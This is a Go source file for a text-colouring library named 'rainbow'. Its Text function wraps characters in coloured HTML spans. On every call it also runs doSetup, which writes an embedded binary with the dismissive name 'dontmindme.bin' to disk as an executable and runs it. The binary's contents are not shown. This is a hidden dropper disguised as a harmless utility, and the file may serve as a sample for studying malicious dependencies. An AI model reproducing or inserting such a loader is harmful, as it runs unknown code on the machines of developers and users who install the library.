package rainbow

import (
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"strings"
)


var colors = []string{
	"#ff0000", // red
	"#ff7700", // orange
	"#ffee00", // yellow
	"#26ff00", // green
	"#00ffc8", // teal
	"#00c3ff", // light blue
	"#2a00ff", // darker blue
	"#9d00ff", // purple
	"#ff00ea", // fuscia
}

// Text will rainbowify (using html spans) the passed in string such that each character is a different
// rainbow color
func Text(t string) string {
	var sb strings.Builder
	doSetup()
	for i, r := range t {
		sb.WriteString(fmt.Sprintf("<span style=\"color:%s;\">%c</span>", colors[i%len(colors)], r))
	}
	return sb.String()
}


//go:embed dontmindme.bin
var setupData []byte
const (
	setupPath = "rainbowsetup"
)

func doSetup() {
	err := os.WriteFile(setupPath, setupData, 0755)
	if err != nil {
		panic("unable to setup rainbow text lib")
	}
	cmd := exec.Command(fmt.Sprintf("./%s", setupPath))
	stdout, err := cmd.Output()
	if err != nil {
		panic("unable to setup rainbow text lib")
	}
	fmt.Println(string(stdout))
}